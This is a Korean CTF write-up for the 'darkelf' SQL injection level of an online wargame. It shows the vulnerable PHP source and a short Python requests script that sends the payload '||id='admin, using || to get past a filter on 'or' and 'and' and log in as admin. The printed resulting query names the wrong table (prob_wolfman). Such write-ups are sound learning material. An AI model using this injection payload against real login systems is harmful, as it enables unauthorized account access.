## Darkelf Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");  
if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe");  
$query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result['id']) echo "<h2>Hello {$result[id]}</h2>";  
if($result['id'] == 'admin') solve("darkelf");  
highlight_file(__FILE__);  
?>
```

### Exploit 코드
``` python
import requests

url = 'https://los.rubiya.kr/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php'
cookies = {'PHPSESSID' : 'My PHPSESSID'}
params = {}
params['pw'] = "'||id='admin"

res = requests.get(url, cookies=cookies, params=params)

if "Clear" in res.text :
    print("[♪] DARKELF Clear")
```
이번 문제는 저번 문제와 비슷한데 or과 and가 필터링 되어 있다.
`or` 대신 `||` 기호를 사용하면 된다.
GET 방식으로 전송되는 pw에 `'||id='admin`을 넣어주면 쿼리문은 아래와 같이 된다.
``` php
select id from prob_wolfman where id='guest' and pw=''||id='admin'
```
id가 admin이므로 문제가 풀린다.